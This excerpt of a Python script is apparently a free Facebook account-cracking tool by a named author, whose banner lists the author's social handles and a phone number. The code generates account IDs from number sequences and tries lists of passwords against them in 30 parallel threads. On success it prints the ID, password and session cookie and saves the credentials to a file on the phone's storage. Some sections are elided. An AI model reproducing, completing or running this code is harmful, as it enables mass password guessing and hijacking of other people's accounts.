...
logo= ("""       
 ...
 \033[38;5;46m _   _                _     
\033[37;1m | \ | |              | |    
    \033[35;1m|  \| | ___ _ __ ___ | |__  
\033[30;1m | . ` |/ _ \ '__/ _ \| '_ \ 
 \033[31;1m| |\  |  __/ | | (_) | |_) |
 \033[33;1m|_| \_|\___|_|  \___/|_.__/ 
                             
Nerob+Rubayet+Jamal+Rashed we are very close friend          
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMd Nerob Ali ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • Md Nerob Ali       ║  \033[1;97m  
╠══[Github                   • \33[1;38mnerob0099000 ║\33[1;34m   
╠══[Whatsapp                 • 01834859933 ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
...
def bhoot():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as Nerob:
        tl = str(len(user))
        ...
        for love in user:
            ...
            ids = code+love
            Nerob.submit(api,ids,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))
    
def api(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] Nerob~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[Nerob-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/Nerob-OK.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
